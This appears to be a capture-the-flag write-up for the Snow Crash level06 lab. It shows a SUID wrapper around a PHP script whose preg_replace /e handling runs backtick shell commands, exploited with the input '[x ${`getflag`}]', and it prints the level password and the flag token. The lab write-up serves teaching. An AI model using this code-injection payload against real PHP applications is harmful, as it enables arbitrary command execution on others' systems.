Login as `level06`.
```shell
┌──$ [~/42/2021/snow-crash]
└─>  ssh 192.168.1.64 -p 4242 -l level06
level06@192.168.1.64's password: viuaaale9huek52boumoomioc
```
A PHP script and an `SUID` executable are located in home directory.
```shell
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
level06@SnowCrash:~$ echo 'Hello World!' > /tmp/hello
level06@SnowCrash:~$ ./level06 /tmp/hello
Hello World!
```
`file_get_contents` - reads entire file into a string.

`preg_replace` - usage together with the `/e` modifier was quite common among PHP-based scripts, apps and interfaces until few years ago.

It is possible to execute shell in PHP with backticks.


By using variable variables[¹](https://www.php.net/manual/en/language.variables.variable.php), an error can be generated which will show the flag.
```shell
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/flag06
level06@SnowCrash:~$ ./level06 /tmp/flag06
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```
PHP evaluated `getflag` and then tried to print variable. But as it was undefined it show an error.
